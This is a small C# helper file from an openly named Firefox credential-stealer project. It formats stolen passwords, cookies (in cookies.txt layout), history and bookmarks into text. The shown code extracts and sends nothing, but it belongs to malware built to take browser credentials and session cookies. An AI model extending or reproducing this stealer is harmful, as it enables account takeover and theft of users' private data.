/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/FireFox-Thief
*/

using System;
using static Stealer.Helpers.Common;

namespace Stealer.Helpers
{
    internal sealed class BrowserUtils
    {
        public static string FormatPassword(Password pPassword)
        {
            return String.Format("Hostname: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
        }
        public static string FormatCookie(Cookie cCookie)
        {
            return String.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", cCookie.sHostKey, cCookie.sPath, cCookie.sExpiresUtc, cCookie.sName, cCookie.sValue);
        }
        public static string FormatHistory(Site sSite)
        {
            return String.Format("### {0} ### ({1}) {2}\n", sSite.sTitle, sSite.sUrl, sSite.iCount);
        }
        public static string FormatBookmark(Bookmark bBookmark)
        {
            if (!string.IsNullOrEmpty(bBookmark.sUrl))
                return String.Format("### {0} ### ({1})\n", bBookmark.sTitle, bBookmark.sUrl);
            else
                return String.Format("### {0} ###\n", bBookmark.sTitle);
        }
    }
}